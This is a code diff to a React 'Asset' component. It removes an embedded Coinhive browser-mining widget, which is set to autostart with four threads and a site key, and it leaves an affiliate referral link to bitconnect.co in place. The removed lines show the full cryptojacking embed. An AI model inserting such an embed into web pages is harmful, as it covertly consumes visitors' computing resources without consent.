@@ -284,11 +284,6 @@ class Asset extends React.Component {
             </tr>
           </tbody>
         </Table>
-        <div className="coinhive-miner" style={{
-          "width": "100%",
-          "height": "94px"
-        }} data-key="NiiRozU9BSqWfKNl81wpAS5lwJgbhb1U" data-autostart="true" data-whitelabel="false" data-background="#000000" data-text="#eeeeee" data-action="#00ff00" data-graph="#555555" data-threads="4" data-throttle="0.1"></div>
-        <br/>
         <a href="https://bitconnect.co/?ref=supanat">
           <div style={{
             'textAlign': 'center',
